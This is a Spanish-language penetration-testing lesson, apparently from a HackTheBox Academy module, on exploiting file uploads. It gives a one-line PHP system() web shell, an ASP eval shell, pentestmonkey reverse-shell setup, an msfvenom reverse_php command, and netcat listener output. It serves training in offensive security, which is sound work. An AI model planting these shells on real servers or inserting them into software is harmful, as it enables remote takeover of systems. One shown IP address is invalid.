El paso final para explotar esta aplicación web es subir el script malicioso en el mismo lenguaje que la aplicación web, como un web shell o un reverse shell script. Una vez que subamos nuestro script malicioso y visitemos su enlace, deberíamos poder interactuar con él para tomar control sobre el servidor back-end.

---

## Web Shells

Podemos encontrar muchos web shells excelentes en línea que proporcionan características útiles, como la traversal de directorios o la transferencia de archivos. Una buena opción para `PHP` es [phpbash](https://github.com/Arrexel/phpbash), que proporciona un web shell semi-interactivo similar a un terminal. Además, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) proporciona una gran cantidad de web shells para diferentes frameworks y lenguajes, que se pueden encontrar en el directorio `/opt/useful/SecLists/Web-Shells` en `PwnBox`.

Podemos descargar cualquiera de estos web shells para el lenguaje de nuestra aplicación web (`PHP` en nuestro caso), luego subirlo a través de la característica de carga vulnerable, y visitar el archivo subido para interactuar con el web shell. Por ejemplo, intentemos subir `phpbash.php` de [phpbash](https://github.com/Arrexel/phpbash) a nuestra aplicación web, y luego navegar a su enlace haciendo clic en el botón de Descargar:

   
`http://SERVER_IP:PORT/uploads/phpbash.php`
![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg)

Como podemos ver, este web shell proporciona una experiencia similar a un terminal, lo que facilita mucho la enumeración del servidor back-end para una explotación adicional. Prueba algunos otros web shells de SecLists, y ve cuáles se adaptan mejor a tus necesidades.

---

## Writing Custom Web Shell

Aunque el uso de web shells de recursos en línea puede proporcionar una gran experiencia, también debemos saber cómo escribir un web shell simple manualmente. Esto se debe a que puede que no tengamos acceso a herramientas en línea durante algunas pruebas de penetración, por lo que necesitamos poder crear uno cuando sea necesario.

Por ejemplo, con aplicaciones web `PHP`, podemos usar la función `system()` que ejecuta comandos del sistema e imprime su salida, y pasarle el parámetro `cmd` con `$_REQUEST['cmd']`, como sigue:


```php
<?php system($_REQUEST['cmd']); ?>
```

Si escribimos el script anterior en `shell.php` y lo subimos a nuestra aplicación web, podemos ejecutar comandos del sistema con el parámetro `?cmd=` en GET (por ejemplo, `?cmd=id`), como sigue:

`http://SERVER_IP:PORT/uploads/shell.php?cmd=id`

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

Esto puede no ser tan fácil de usar como otros web shells que podemos encontrar en línea, pero aún proporciona un método interactivo para enviar comandos y recuperar su salida. Podría ser la única opción disponible durante algunas pruebas de penetración web.

**Tip:** Si estamos usando este web shell personalizado en un navegador, puede ser mejor usar la vista de código fuente haciendo clic en `[CTRL+U]`, ya que la vista de código fuente muestra la salida del comando como se mostraría en el terminal, sin ningún renderizado de HTML que pueda afectar cómo se formatea la salida.

Los web shells no son exclusivos de `PHP`, y lo mismo se aplica a otros frameworks web, con la única diferencia siendo las funciones utilizadas para ejecutar comandos del sistema. Para aplicaciones web `.NET`, podemos pasar el parámetro `cmd` con `request('cmd')` a la función `eval()`, y también debería ejecutar el comando especificado en `?cmd=` e imprimir su salida, como sigue:


```r
<% eval request('cmd') %>
```

Podemos encontrar varios otros web shells en línea, muchos de los cuales pueden ser fácilmente memorizados para propósitos de pruebas de penetración web. Debe tenerse en cuenta que `en ciertos casos, los web shells pueden no funcionar`. Esto puede deberse a que el servidor web impide el uso de algunas funciones utilizadas por el web shell (por ejemplo, `system()`), o debido a un Web Application Firewall, entre otras razones. En estos casos, puede que necesitemos usar técnicas avanzadas para eludir estas mitigaciones de seguridad, pero esto está fuera del alcance de este módulo.

---

## Reverse Shell

Finalmente, veamos cómo podemos recibir reverse shells a través de la funcionalidad de carga vulnerable. Para hacerlo, deberíamos empezar descargando un reverse shell script en el lenguaje de la aplicación web. Un reverse shell confiable para `PHP` es el reverse shell de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Además, el mismo [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) que mencionamos anteriormente también contiene scripts de reverse shell para varios lenguajes y frameworks web, y podemos utilizar cualquiera de ellos para recibir un reverse shell también.

Descarguemos uno de los scripts de reverse shell anteriores, como el de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell), y luego ábramoslo en un editor de texto para ingresar nuestro `IP` y `PORT` de escucha, a los que el script se conectará. Para el script de `pentestmonkey`, podemos modificar las líneas `49` y `50` e ingresar el IP/PORT de nuestra máquina:


```r
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Luego, podemos iniciar un listener de `netcat` en nuestra máquina (con el puerto mencionado anteriormente), subir nuestro script a la aplicación web, y luego visitar su enlace para ejecutar el script y obtener una conexión de reverse shell:


```r
nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, recibimos exitosamente una conexión desde el servidor back-end que aloja la aplicación web vulnerable, lo que nos permite interactuar con él para una explotación adicional. El mismo concepto se puede usar para otros frameworks web y lenguajes, con la única diferencia siendo el script de reverse shell que usamos.

---

## Generating Custom Reverse Shell Scripts

Al igual que con los web shells, también podemos crear nuestros propios scripts de reverse shell. Aunque es posible usar la misma función `system` anterior y pasarle un comando de reverse shell, esto puede no ser muy confiable, ya que el comando puede fallar por muchas razones, al igual que cualquier otro comando de reverse shell.

Por eso, siempre es mejor usar funciones del core del framework web para conectarse a nuestra máquina. Sin embargo, esto puede no ser tan fácil de memorizar como un script de web shell. Afortunadamente, herramientas como `msfvenom` pueden generar un script de reverse shell en muchos lenguajes e incluso intentar eludir ciertas restricciones. Podemos hacerlo de la siguiente manera para `PHP`:


```r
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

Una vez que se genera nuestro script `reverse.php`, podemos nuevamente iniciar un listener de `netcat` en el puerto que especificamos anteriormente, subir el script `reverse.php` y visitar su enlace, y deberíamos recibir también una conexión de reverse shell:


```r
nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

De manera similar, podemos generar scripts de reverse shell para varios lenguajes. Podemos usar muchos payloads de reverse shell con el flag `-p` y especificar el lenguaje de salida con el flag `-f`.

Aunque los reverse shells siempre se prefieren sobre los web shells, ya que proporcionan el método más interactivo para controlar el servidor comprometido, puede que no siempre funcionen, y puede que tengamos que depender de los web shells en su lugar. Esto puede ser por varias razones, como tener un firewall en la red back-end que impide las conexiones salientes o si el servidor web desactiva las funciones necesarias para iniciar una conexión de vuelta a nosotros.